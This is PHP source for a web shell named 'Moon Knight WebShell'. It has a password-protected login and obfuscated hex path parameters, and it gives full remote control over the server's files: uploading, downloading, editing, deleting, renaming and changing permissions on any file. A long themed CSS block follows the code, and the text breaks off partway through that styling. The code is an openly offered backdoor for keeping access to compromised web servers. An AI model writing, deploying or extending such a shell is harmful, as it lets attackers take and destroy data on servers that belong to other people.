<?php
session_start();
error_reporting(0);

// Password Hash (default: "password"), ganti sesuai kebutuhan!
$correct_password_hash = '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi';

// Helper functions
function nhx($str) {
    $r = "";
    $len = strlen($str);
    for ($i=0; $i<$len; $i+=2) {
        $r .= chr(hexdec($str[$i].$str[$i+1]));
    }
    return $r;
}
function hex($str) {
    $r = "";
    for ($i=0; $i<strlen($str); $i++) {
        $h = dechex(ord($str[$i]));
        $r .= strlen($h)<2 ? '0'.$h : $h;
    }
    return $r;
}
function perms($f) {
    $p = @fileperms($f);
    if ($p === false) return '---------';
    $i = '';
    $i .= ($p & 0x4000) ? 'd' : (($p & 0xA000) ? 'l' : '-');
    $i .= ($p & 0x0100) ? 'r' : '-';
    $i .= ($p & 0x0080) ? 'w' : '-';
    $i .= ($p & 0x0040) ? 'x' : '-';
    $i .= ($p & 0x0020) ? 'r' : '-';
    $i .= ($p & 0x0010) ? 'w' : '-';
    $i .= ($p & 0x0008) ? 'x' : '-';
    $i .= ($p & 0x0004) ? 'r' : '-';
    $i .= ($p & 0x0002) ? 'w' : '-';
    $i .= ($p & 0x0001) ? 'x' : '-';
    return $i;
}
function a($msg, $sts=1, $loc="") {
    global $p;
    $status=($sts==1)?"success":"error";
    echo "<script>
        swal({title:'{$status}',text:'{$msg}',icon:'{$status}'}).then(()=>{
            window.location.href = '?p=".hex($p).$loc."';
        });
    </script>";
    exit();
}
function deldir($d) {
    if(trim(pathinfo($d, PATHINFO_BASENAME),'.')==='') return;
    if(is_dir($d)) {
        $files=array_diff(scandir($d), ['.', '..']);
        foreach($files as $f) deldir("$d/$f");
        rmdir($d);
    } else unlink($d);
}
function path_links($full_path) {
    $parts=explode(DIRECTORY_SEPARATOR, $full_path);
    $accum='';
    $links=[];
    if (PHP_OS_FAMILY === 'Windows' && isset($parts[0]) && strpos($parts[0], ':')!==false) {
        $accum=array_shift($parts).DIRECTORY_SEPARATOR;
        $real=realpath($accum)?:$accum;
        $links[]='<a href="?p='.bin2hex($real).'">'.htmlspecialchars($accum).'</a>';
    }
    foreach ($parts as $part) {
        if ($part==='') continue;
        $accum=rtrim($accum,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.$part;
        $real=realpath($accum);
        if ($real!==false) $links[]='<a href="?p='.bin2hex($real).'">'.htmlspecialchars($part).'</a>';
    }
    return implode(' &raquo; ', $links);
}

// Login check
if(!isset($_SESSION['authenticated']) || $_SESSION['authenticated']!==true){
    if($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['pass'])){
        if(password_verify($_POST['pass'],$correct_password_hash)){
            $_SESSION['authenticated']=true;
            $_SESSION['login_time']=time();
            header("Location: ".$_SERVER['PHP_SELF']);
            exit();
        } else $login_error="Invalid password";
    }
    ?>
    <!doctype html><html lang="en"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/>
    <title>Login - Moon Knight WebShell</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cinzel:wght@400;700;900&family=Roboto:wght@300;400;500&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #0a0a14 url('https://i.ibb.co/5hhLv0hB/Moon-Knight-Featured.jpg') no-repeat center center fixed;
            background-size: cover;
            color: #e8e8e8;
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            position: relative;
            overflow: hidden;
        }
        
        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at center, rgba(10, 10, 20, 0.7) 0%, rgba(5, 5, 16, 0.9) 100%);
            z-index: -1;
        }
        
        .moon-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><circle cx="50" cy="50" r="40" fill="none" stroke="%23d4af37" stroke-width="0.5" opacity="0.1"/></svg>') repeat;
            z-index: -1;
            animation: pulse 20s infinite alternate;
        }
        
        @keyframes pulse {
            0% { opacity: 0.1; }
            100% { opacity: 0.3; }
        }
        
        .login-container {
            background: rgba(20, 20, 35, 0.85);
            padding: 2.5rem;
            border: 2px solid #d4af37;
            border-radius: 12px;
            width: 420px;
            text-align: center;
            box-shadow: 0 0 35px rgba(212, 175, 55, 0.4);
            backdrop-filter: blur(10px);
            position: relative;
            overflow: hidden;
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }
        
        .login-container:hover {
            transform: translateY(-5px);
            box-shadow: 0 0 45px rgba(212, 175, 55, 0.6);
        }
        
        .login-container::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, rgba(212, 175, 55, 0.1), transparent);
            transform: rotate(45deg);
            animation: shine 3s infinite;
        }
        
        @keyframes shine {
            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
        }
        
        .login-container h2 {
            margin-top: 0;
            color: #d4af37;
            font-weight: bold;
            font-size: 2.2rem;
            text-shadow: 0 0 15px rgba(212, 175, 55, 0.7);
            margin-bottom: 1.5rem;
            font-family: 'Cinzel', serif;
            letter-spacing: 2px;
        }
        
        .login-form input {
            width: calc(100% - 22px);
            padding: 14px;
            margin: 12px 0;
            background: rgba(10, 10, 20, 0.8);
            border: 1px solid #d4af37;
            color: #e8e8e8;
            border-radius: 6px;
            font-size: 1rem;
            transition: all 0.3s ease;
        }
        
        .login-form input:focus {
            outline: none;
            border-color: #f0e6d2;
            box-shadow: 0 0 12px rgba(212, 175, 55, 0.7);
            background: rgba(15, 15, 25, 0.9);
        }
        
        .login-form button {
            background: linear-gradient(135deg, #d4af37, #b8941f, #d4af37);
            background-size: 200% 200%;
            color: #0a0a14;
            border: none;
            padding: 14px 20px;
            cursor: pointer;
            width: 100%;
            border-radius: 6px;
            font-weight: bold;
            font-size: 1.1rem;
            margin-top: 15px;
            transition: all 0.4s ease;
            font-family: 'Cinzel', serif;
            letter-spacing: 1px;
            animation: gradientShift 3s ease infinite;
        }
        
        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        
        .login-form button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(212, 175, 55, 0.8);
        }
        
        .error {
            color: #ff6b6b;
            margin: 10px 0;
            background: rgba(255, 107, 107, 0.1);
            padding: 10px;
            border-radius: 6px;
            border: 1px solid #ff6b6b;
            font-weight: 500;
        }
        
        .logo-login {
            width: 100%;
            height: auto;
            border-radius: 8px;
            margin-bottom: 20px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
            transition: transform 0.5s ease;
        }
        
        .logo-login:hover {
            transform: scale(1.02);
        }
        
        .moonknight-text {
            color: #d4af37;
            font-size: 14px;
            margin-top: 20px;
            font-weight: bold;
            letter-spacing: 1px;
            font-family: 'Cinzel', serif;
        }
        
        .hieroglyph {
            position: absolute;
            font-size: 2rem;
            opacity: 0.1;
            color: #d4af37;
        }
        
        .hieroglyph:nth-child(1) { top: 10px; left: 15px; }
        .hieroglyph:nth-child(2) { top: 10px; right: 15px; }
        .hieroglyph:nth-child(3) { bottom: 10px; left: 15px; }
        .hieroglyph:nth-child(4) { bottom: 10px; right: 15px; }
    </style>
    </head><body>
    <div class="moon-overlay"></div>
    <div class="login-container">
        <div class="hieroglyph">☥</div>
        <div class="hieroglyph">⚚</div>
        <div class="hieroglyph">𓂀</div>
        <div class="hieroglyph">𓃭</div>
        
        <img src="https://i.ibb.co/KJMqgTh/moon-knight-season-2.jpg" alt="Moon Knight" class="logo-login"/>
        <h2>MOON KNIGHT WEBSHELL</h2>
        <?php if(isset($login_error)) echo '<div class="error">'.htmlspecialchars($login_error).'</div>'; ?>
        <form class="login-form" method="post" autocomplete="off" autofocus>
            <input type="password" name="pass" placeholder="Enter Password" required/>
            <button type="submit">JUDGES SYSTEM</button>
        </form>
        <div class="moonknight-text">PROTECTOR OF FILES • SERVANT OF KHONSHU</div>
    </div>
    </body></html><?php exit();
}

// Logout
if(isset($_GET['logout'])){
    session_destroy();
    header("Location: ".$_SERVER['PHP_SELF']);
    exit();
}

// Working directory
$p=isset($_GET['p'])?nhx($_GET['p']):getcwd();
$p=realpath($p);
if($p===false || !is_dir($p)) $p=getcwd();

$sort=isset($_GET['sort'])?$_GET['sort']:'name_asc';
function sort_items($a,$b){
    global $p,$sort;
    $pathA=$p.DIRECTORY_SEPARATOR.$a;
    $pathB=$p.DIRECTORY_SEPARATOR.$b;
    $isDirA=is_dir($pathA);
    $isDirB=is_dir($pathB);
    if($isDirA&&!$isDirB)return -1;
    if(!$isDirA&&$isDirB)return 1;
    switch($sort){
        case 'name_desc':return strcasecmp($b,$a);
        case 'size_asc':return (is_dir($pathA)?0:filesize($pathA))-(is_dir($pathB)?0:filesize($pathB));
        case 'size_desc':return (is_dir($pathB)?0:filesize($pathB))-(is_dir($pathA)?0:filesize($pathA));
        case 'date_asc':return filemtime($pathA)-filemtime($pathB);
        case 'date_desc':return filemtime($pathB)-filemtime($pathA);
        default:return strcasecmp($a,$b);
    }
}
$items=array_diff(scandir($p),['.','..']);
usort($items,'sort_items');

$action=isset($_GET['a']) ? nhx($_GET['a']) : '';
$fileNameParam=isset($_GET['n']) ? nhx($_GET['n']) : '';

// Handle file upload
if(isset($_FILES['f'])){
    $names=$_FILES['f']['name'];
    $ok=true;
    foreach($names as $i=>$name){
        $file=basename($name);
        $target=$p.DIRECTORY_SEPARATOR.$file;
        if(!move_uploaded_file($_FILES['f']['tmp_name'][$i],$target)) $ok=false;
    }
    if($ok) {
        echo "<script>window.location.href = '?p=".hex($p)."&upload_success=1';</script>";
        exit();
    } else {
        echo "<script>window.location.href = '?p=".hex($p)."&upload_error=1';</script>";
        exit();
    }
}
// Create file / folder
if(isset($_POST['create_submit'])&&isset($_POST['type'])&&isset($_POST['filename'])){
    $new=$p.DIRECTORY_SEPARATOR.$_POST['filename'];
    if(!file_exists($new)){
        if($_POST['type']==='directory'){
            mkdir($new);
            echo "<script>window.location.href = '?p=".hex($p)."&folder_created=1';</script>";
            exit();
        } else if($_POST['type']==='file'){
            file_put_contents($new,'');
            echo "<script>window.location.href = '?p=".hex($p)."&file_created=1';</script>";
            exit();
        }
    } else {
        echo "<script>window.location.href = '?p=".hex($p)."&exists_error=1';</script>";
        exit();
    }
}
// Download
if(isset($_GET['download'])){
    $file=$p.DIRECTORY_SEPARATOR.nhx($_GET['download']);
    if(file_exists($file) && is_file($file)){
        header('Content-Type: application/octet-stream');
        header('Content-Length: '.filesize($file));
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        readfile($file);
        exit();
    } else {
        echo "<script>window.location.href = '?p=".hex($p)."&download_error=1';</script>";
        exit();
    }
}
// Delete
if($action==='delete' && $fileNameParam!==''){
    $target=$p.DIRECTORY_SEPARATOR.$fileNameParam;
    if(file_exists($target)){
        if(is_dir($target)) deldir($target);
        else unlink($target);
        echo "<script>window.location.href = '?p=".hex($p)."&deleted=1';</script>";
        exit();
    } else {
        echo "<script>window.location.href = '?p=".hex($p)."&delete_error=1';</script>";
        exit();
    }
}
// Rename
if(isset($_POST['rename_submit'])&&isset($_POST['old_name'])&&isset($_POST['new_name'])){
    $old=$p.DIRECTORY_SEPARATOR.$_POST['old_name'];
    $new=$p.DIRECTORY_SEPARATOR.$_POST['new_name'];
    if(file_exists($old)){
        if(!file_exists($new)){
            rename($old,$new);
            echo "<script>window.location.href = '?p=".hex($p)."&renamed=1';</script>";
            exit();
        } else {
            echo "<script>window.location.href = '?p=".hex($p)."&rename_error=1';</script>";
            exit();
        }
    } else {
        echo "<script>window.location.href = '?p=".hex($p)."&rename_error=1';</script>";
        exit();
    }
}
// Chmod
if(isset($_POST['chmod_submit'])&&isset($_POST['chmod_file'])&&isset($_POST['chmod_mode'])){
    $file = $p.DIRECTORY_SEPARATOR.$_POST['chmod_file'];
    $mode = intval($_POST['chmod_mode'],8);
    if(file_exists($file)){
        if(chmod($file,$mode)) {
            echo "<script>window.location.href = '?p=".hex($p)."&chmod_success=1';</script>";
            exit();
        } else {
            echo "<script>window.location.href = '?p=".hex($p)."&chmod_error=1';</script>";
            exit();
        }
    } else {
        echo "<script>window.location.href = '?p=".hex($p)."&chmod_error=1';</script>";
        exit();
    }
}
// Edit
if(isset($_POST['edit_submit'])&&isset($_POST['edit_file'])&&isset($_POST['edit_content'])){
    $file=$p.DIRECTORY_SEPARATOR.$_POST['edit_file'];
    if(file_exists($file) && is_file($file)){
        if(file_put_contents($file,$_POST['edit_content'])!==false) {
            echo "<script>window.location.href = '?p=".hex($p)."&saved=1';</script>";
            exit();
        } else {
            echo "<script>window.location.href = '?p=".hex($p)."&save_error=1';</script>";
            exit();
        }
    } else {
        echo "<script>window.location.href = '?p=".hex($p)."&save_error=1';</script>";
        exit();
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Moon Knight WebShell</title>
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css"/>
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"/>
<link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400;700;900&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
<style>
:root {
  --moon-gold: #d4af37;
  --moon-gold-light: #f0e6d2;
  --moon-gold-dark: #b8941f;
  --moon-dark: #0a0a14;
  --moon-darker: #050510;
  --moon-blue: #1a1a2e;
  --moon-blue-light: #2a2a4e;
  --moon-light: #e8e8e8;
  --moon-red: #8b0000;
  --moon-sand: #c8ad7f;
}

* {
    font-family: 'Roboto', sans-serif;
}

body {
  background: var(--moon-dark) url('https://i.ibb.co/5hhLv0hB/Moon-Knight-Featured.jpg') no-repeat center center fixed;
  background-size: cover;
  color: var(--moon-light);
  margin: 0;
  padding: 0;
  position: relative;
  overflow-x: hidden;
}

body::before {
  content: '';
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: radial-gradient(circle at center, rgba(10, 10, 20, 0.7) 0%, rgba(5, 5, 16, 0.9) 100%);
  z-index: -1;
}

.moon-pattern {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-image: 
        radial-gradient(circle at 20% 30%, rgba(212, 175, 55, 0.05) 0%, transparent 50%),
        radial-gradient(circle at 80% 70%, rgba(212, 175, 55, 0.05) 0%, transparent 50%);
    z-index: -1;
    pointer-events: none;
    animation: moonGlow 15s infinite alternate;
}

@keyframes moonGlow {
    0% { opacity: 0.3; }
    100% { opacity: 0.7; }
}

.moon-knight-title {
    font-size: 3.5rem;
    text-align: center;
    color: var(--moon-gold);
    text-shadow: 0 0 20px rgba(212, 175, 55, 0.8);
    font-family: 'Cinzel', serif;
    font-weight: 900;
    letter-spacing: 3px;
    margin: 0;
    padding: 20px 0;
    position: relative;
    animation: titleGlow 3s infinite alternate, float 6s ease-in-out infinite;
}

@keyframes titleGlow {
    0% { text-shadow: 0 0 20px rgba(212, 175, 55, 0.8); }
    100% { text-shadow: 0 0 30px rgba(212, 175, 55, 1), 0 0 40px rgba(212, 175, 55, 0.6); }
}

@keyframes float {
    0% { transform: translateY(0px); }
    50% { transform: translateY(-10px); }
    100% { transform: translateY(0px); }
}

header {
  background: linear-gradient(135deg, rgba(26, 26, 46, 0.95) 0%, rgba(42, 42, 78, 0.9) 100%);
  border-bottom: 3px solid var(--moon-gold);
  padding: 10px 30px;
  display: flex;
  flex-wrap: wrap;
  justify-content: center;
  align-items: center;
  font-weight: 600;
  user-select: none;
  position: relative;
  box-shadow: 0 5px 25px rgba(0, 0, 0, 0.7);
  overflow: hidden;
}

header::before {
  content: '';
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="none" stroke="%23d4af37" stroke-width="1" opacity="0.1"/></svg>');
  z-index: 0;
}

header > * {
  position: relative;
  z-index: 1;
}

header .server-info {
  flex: 1 1 100%;
  font-size: 0.9rem;
  margin-top: 8px;
  white-space: pre-line;
  color: var(--moon-gold-light);
  border: 1px solid var(--moon-gold);
  padding: 12px;
  border-radius: 8px;
  max-width: 100%;
  overflow-wrap: break-word;
  user-select: text;
  cursor: default;
  background: rgba(10, 10, 20, 0.7);
  backdrop-filter: blur(5px);
  transition: all 0.3s ease;
  animation: fadeIn 1.5s ease;
}

@keyframes fadeIn {
    from { opacity: 0; transform: translateY(20px); }
    to { opacity: 1; transform: translateY(0); }
}

header .server-info:hover {
  background-color: rgba(212, 175, 55, 0.15);
  color: var(--moon-light);
  box-shadow: 0 0 15px rgba(212, 175, 55, 0.3);
  transform: scale(1.01);
}

header .current-path {
  flex: 1 1 100%;
  margin-top: 8px;
  font-weight: bold;
  font-size: 1rem;
  text-align: left;
  word-break: break-word;
  color: var(--moon-gold-light);
  padding: 10px;
  background: rgba(10, 10, 20, 0.5);
  border-radius: 6px;
  border-left: 3px solid var(--moon-gold);
  animation: slideIn 1s ease;
}

@keyframes slideIn {
    from { opacity: 0; transform: translateX(-20px); }
    to { opacity: 1; transform: translateX(0); }
}

header .current-path a {
  color: var(--moon-gold);
  text-decoration: none;
  margin-right: 7px;
  font-weight: 500;
  transition: all 0.3s ease;
  position: relative;
}

header .current-path a:hover {
  color: var(--moon-gold-light);
  text-decoration: none;
  text-shadow: 0 0 8px rgba(212, 175, 55, 0.8);
}

header .current-path a::after {
  content: '';
  position: absolute;
  bottom: -2px;
  left: 0;
  width: 0;
  height: 1px;
  background: var(--moon-gold);
  transition: width 0.3s ease;
}

header .current-path a:hover::after {
  width: 100%;
}

.logout-btn {
  position: fixed;
  top: 15px;
  right: 15px;
  z-index: 9999;
  background: linear-gradient(135deg, var(--moon-gold), var(--moon-gold-dark));
  color: var(--moon-dark);
  padding: 10px 18px;
  border-radius: 6px;
  font-weight: 700;
  border: 1px solid var(--moon-gold);
  text-decoration: none;
  user-select: none;
  transition: all 0.3s ease;
  font-family: 'Cinzel', serif;
  letter-spacing: 1px;
  box-shadow: 0 4px 12px rgba(212, 175, 55, 0.4);
  animation: pulse 2s infinite;
}

@keyframes pulse {
  0% { box-shadow: 0 0 0 0 rgba(212, 175, 55, 0.7); }
  70% { box-shadow: 0 0 0 10px rgba(212, 175, 55, 0); }
  100% { box-shadow: 0 0 0 0 rgba(212, 175, 55, 0); }
}

.logout-btn:hover {
  background: linear-gradient(135deg, #e5c158, #c9a227);
  color: var(--moon-dark);
  box-shadow: 0 6px 18px rgba(212, 175, 55, 0.6);
  transform: translateY(-2px) scale(1.05);
}

.audio-control {
  position: fixed;
  top: 15px;
  left: 15px;
  z-index: 9999;
  background: linear-gradient(135deg, var(--moon-gold), var(--moon-gold-dark));
  color: var(--moon-dark);
  padding: 10px 15px;
  border-radius: 6px;
  font-weight: 700;
  border: 1px solid var(--moon-gold);
  text-decoration: none;
  user-select: none;
  transition: all 0.3s ease;
  font-family: 'Cinzel', serif;
  letter-spacing: 1px;
  box-shadow: 0 4px 12px rgba(212, 175, 55, 0.4);
  cursor: pointer;
  animation: rotate 10s infinite linear;
}

@keyframes rotate {
  from { transform: rotate(0deg); }
  to { transform: rotate(360deg); }
}

.audio-control:hover {
  background: linear-gradient(135deg, #e5c158, #c9a227);
  color: var(--moon-dark);
  box-shadow: 0 6px 18px rgba(212, 175, 55, 0.6);
  transform: scale(1.1);
}

a {
  color: var(--moon-gold);
  transition: color 0.3s ease;
}

a:hover {
  color: var(--moon-gold-light);
  text-decoration: none;
}

.table-hover tbody tr {
  transition: all 0.3s ease;
  animation: fadeInUp 0.5s ease forwards;
  opacity: 0;
}

@keyframes fadeInUp {
  from { opacity: 0; transform: translateY(20px); }
  to { opacity: 1; transform: translateY(0); }
}

.table-hover tbody tr:hover td {
  background: rgba(212, 175, 55, 0.15);
  transform: translateX(5px);
  transition: all 0.3s ease;
}

.table > tbody > tr > * {
  color: var(--moon-light);
  vertical-align: middle;
  white-space: nowrap;
  border-color: rgba(212, 175, 55, 0.3) !important;
  transition: all 0.3s ease;
}

.form-control {
  background: rgba(10, 10, 20, 0.8) !important;
  color: var(--moon-light) !important;
  border-radius: 6px;
  border: 1px solid var(--moon-gold) !important;
  transition: all 0.3s ease;
}

.form-control:focus {
  background: rgba(15, 15, 25, 0.9) !important;
  color: var(--moon-light) !important;
  border-color: var(--moon-gold-light) !important;
  box-shadow: 0 0 12px rgba(212, 175, 55, 0.6);
  transform: scale(1.02);
}

.form-control::placeholder {
  color: var(--moon-sand);
  opacity: 1;
}

.btn-outline-light {
  color: var(--moon-gold);
  border-color: var(--moon-gold);
  background: transparent;
  transition: all 0.3s ease;
  position: relative;
  overflow: hidden;
}

.btn-outline-light::before {
  content: '';
  position: absolute;
  top: 0;
  left: -100%;
  width: 100%;
  height: 100%;
  background: linear-gradient(90deg, transparent, rgba(212, 175, 55, 0.2), transparent);
  transition: left 0.5s ease;
}

.btn-outline-light:hover::before {
  left: 100%;
}

.btn-outline-light:hover {
  background-color: var(--moon-gold);
  border-color: var(--moon-gold);
  color: var(--moon-dark);
  transform: translateY(-2px);
  box-shadow: 0 5px 15px rgba(212, 175, 55, 0.4);
}

.custom-file-label {
  background-color: rgba(10, 10, 20, 0.8) !important;
  color: var(--moon-light) !important;
  border: 1px solid var(--moon-gold) !important;
  border-radius: 6px;
  transition: all 0.3s ease;
}

.custom-file-input:focus ~ .custom-file-label {
  border-color: var(--moon-gold-light) !important;
  box-shadow: 0 0 8px rgba(212, 175, 55, 0.5);
}

#uploadForm {
  margin-bottom: 1rem;
  animation: slideInRight 1s ease;
}

@keyframes slideInRight {
    from { opacity: 0; transform: translateX(20px); }
    to { opacity: 1; transform: translateX(0); }
}

#createFormArea {
  margin: 20px 0 0 0;
  display: flex;
  gap: 20px;
  flex-wrap: wrap;
}

#createFormArea form {
  flex: 1;
  min-width: 200px;
  background: rgba(26, 26, 46, 0.8);
  padding: 20px;
  border-radius: 10px;
  border: 1px solid var(--moon-gold);
  box-shadow: 0 0 20px rgba(212, 175, 55, 0.4);
  backdrop-filter: blur(5px);
  transition: all 0.3s ease;
  animation: bounceIn 1s ease;
}

@keyframes bounceIn {
  0% { transform: scale(0.5); opacity: 0; }
  70% { transform: scale(1.05); opacity: 1; }
  100% { transform: scale(1); opacity: 1; }
}

#createFormArea form:hover {
  box-shadow: 0 0 25px rgba(212, 175, 55, 0.6);
  transform: translateY(-3px) scale(1.02);
}

#actionArea {
  background-color: rgba(26, 26, 46, 0.9);
  border: 1px solid var(--moon-gold);
  border-radius: 10px;
  padding: 20px;
  margin: 20px 0 0 0;
  color: var(--moon-light);
  box-shadow: 0 0 20px rgba(212, 175, 55, 0.4);
  backdrop-filter: blur(5px);
  animation: zoomIn 0.5s ease;
}

@keyframes zoomIn {
  from { opacity: 0; transform: scale(0.8); }
  to { opacity: 1; transform: scale(1); }
}

/* Wrapper container for main content to align spacing left-right with footer */
#mainContentWrapper {
  margin: 20px 30px 30px 30px;
  min-height: 60vh;
}

/* Table container style inside main content */
.table-container {
  background-color: rgba(26, 26, 46, 0.8);
  border: 1px solid var(--moon-gold);
  border-radius: 10px;
  padding: 1.5rem;
  overflow-x: auto;
  box-shadow: 0 0 20px rgba(212, 175, 55, 0.4);
  backdrop-filter: blur(5px);
  position: relative;
  animation: fadeIn 1s ease;
}

.table-container::before {
  content: '';
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="none" stroke="%23d4af37" stroke-width="0.5" opacity="0.1"/></svg>');
  pointer-events: none;
  border-radius: 10px;
}

.table thead th {
  border-bottom: 2px solid var(--moon-gold);
  color: var(--moon-gold);
  font-weight: bold;
  font-family: 'Cinzel', serif;
  letter-spacing: 1px;
  font-size: 1.1rem;
  padding: 15px 12px;
  animation: glow 2s infinite alternate;
}

@keyframes glow {
  from { text-shadow: 0 0 5px rgba(212, 175, 55, 0.5); }
  to { text-shadow: 0 0 10px rgba(212, 175, 55, 0.8), 0 0 15px rgba(212, 175, 55, 0.6); }
}

.fa-folder, .fa-file { 
  transition: all 0.3s ease;
  display: inline-block;
}

.fa-folder { 
  color: var(--moon-gold); 
}

.fa-file { 
  color: var(--moon-gold-light); 
}

.fa-folder:hover, .fa-file:hover {
  transform: scale(1.3) rotate(10deg);
  filter: drop-shadow(0 0 8px rgba(212, 175, 55, 0.9));
  animation: iconPulse 0.5s ease;
}

@keyframes iconPulse {
  0% { transform: scale(1); }
  50% { transform: scale(1.5); }
  100% { transform: scale(1.3); }
}

.modal-content {
  background: var(--moon-blue);
  border: 2px solid var(--moon-gold);
  border-radius: 10px;
  box-shadow: 0 0 30px rgba(212, 175, 55, 0.5);
  animation: modalAppear 0.5s ease;
}

@keyframes modalAppear {
  from { opacity: 0; transform: scale(0.7) translateY(-50px); }
  to { opacity: 1; transform: scale(1) translateY(0); }
}

.modal-header {
  border-bottom: 1px solid var(--moon-gold);
  background: rgba(26, 26, 46, 0.9);
  border-radius: 10px 10px 0 0;
}

.modal-title {
  color: var(--moon-gold);
  font-family: 'Cinzel', serif;
}

.close {
  color: var(--moon-gold);
  opacity: 0.8;
  text-shadow: none;
  transition: all 0.3s ease;
}

.close:hover {
  color: var(--moon-gold-light);
  opacity: 1;
  transform: scale(1.2) rotate(90deg);
}

.stats-panel {
  background: rgba(26, 26, 46, 0.8);
  border: 1px solid var(--moon-gold);
  border-radius: 10px;
  padding: 15px;
  margin-bottom: 20px;
  box-shadow: 0 0 15px rgba(212, 175, 55, 0.3);
  backdrop-filter: blur(5px);
  animation: flipInX 1s ease;
}

@keyframes flipInX {
  from {
    transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
    animation-timing-function: ease-in;
    opacity: 0;
  }
  40% {
    transform: perspective(400px) rotate3d(1, 0, 0, -20deg);
    animation-timing-function: ease-in;
  }
  60% {
    transform: perspective(400px) rotate3d(1, 0, 0, 10deg);
    opacity: 1;
  }
  80% {
    transform: perspective(400px) rotate3d(1, 0, 0, -5deg);
  }
  to {
    transform: perspective(400px);
  }
}

.stats-item {
  text-align: center;
  padding: 10px;
  transition: all 0.3s ease;
}

.stats-item:hover {
  transform: translateY(-5px);
}

.stats-value {
  font-size: 1.8rem;
  font-weight: bold;
  color: var(--moon-gold);
  font-family: 'Cinzel', serif;
  text-shadow: 0 0 10px rgba(212, 175, 55, 0.5);
  animation: countUp 2s ease;
}

@keyframes countUp {
  from { opacity: 0; transform: translateY(20px); }
  to { opacity: 1; transform: translateY(0); }
}

.stats-label {
  font-size: 0.9rem;
  color: var(--moon-gold-light);
  text-transform: uppercase;
  letter-spacing: 1px;
}

.quick-actions {
  display: flex;
  gap: 10px;
  margin-bottom: 20px;
  flex-wrap: wrap;
}

.quick-action-btn {
  flex: 1;
  min-width: 120px;
  background: rgba(26, 26, 46, 0.8);
  border: 1px solid var(--moon-gold);
  color: var(--moon-gold);
  padding: 12px;
  border-radius: 8px;
  text-align: center;
  cursor: pointer;
  transition: all 0.3s ease;
  font-weight: 500;
  animation: slideInUp 0.5s ease forwards;
  opacity: 0;
}

@keyframes slideInUp {
  from { opacity: 0; transform: translateY(30px); }
  to { opacity: 1; transform: translateY(0); }
}

.quick-action-btn:nth-child(1) { animation-delay: 0.1s; }
.quick-action-btn:nth-child(2) { animation-delay: 0.2s; }
.quick-action-btn:nth-child(3) { animation-delay: 0.3s; }
.quick-action-btn:nth-child(4) { animation-delay: 0.4s; }

.quick-action-btn:hover {
  background: var(--moon-gold);
  color: var(--moon-dark);
  transform: translateY(-5px) scale(1.05);
  box-shadow: 0 8px 20px rgba(212, 175, 55, 0.5);
}

.hieroglyph-bg {
  position: absolute;
  font-size: 8rem;
  opacity: 0.03;
  color: var(--moon-gold);
  z-index: 0;
  pointer-events: none;
  animation: floatSymbols 20s infinite linear;
}

@keyframes floatSymbols {
  0% { transform: translateY(0px) rotate(0deg); }
  50% { transform: translateY(-20px) rotate(180deg); }
  100% { transform: translateY(0px) rotate(360deg); }
}

.hieroglyph-bg-1 { top: 10%; left: 5%; animation-delay: 0s; }
.hieroglyph-bg-2 { top: 60%; right: 5%; animation-delay: 5s; }
.hieroglyph-bg-3 { top: 30%; left: 10%; animation-delay: 10s; }
.hieroglyph-bg-4 { bottom: 20%; right: 15%; animation-delay: 15s; }

.floating-sand {
  position: fixed;
  width: 5px;
  height: 5px;
  background: var(--moon-sand);
  border-radius: 50%;
  opacity: 0.7;
  animation: sandFall 10s linear infinite;
  z-index: 0;
}

@keyframes sandFall {
  0% {
    transform: translateY(-100px) rotate(0deg);
    opacity: 0;
  }
  10% {
    opacity: 0.7;
  }
  90% {
    opacity: 0.7;
  }
  100% {
    transform: translateY(100vh) rotate(360deg);
    opacity: 0;
  }
}

/* Generate multiple sand particles */
.floating-sand:nth-child(1) { left: 5%; animation-delay: 0s; }
.floating-sand:nth-child(2) { left: 15%; animation-delay: 1s; }
.floating-sand:nth-child(3) { left: 25%; animation-delay: 2s; }
.floating-sand:nth-child(4) { left: 35%; animation-delay: 3s; }
.floating-sand:nth-child(5) { left: 45%; animation-delay: 4s; }
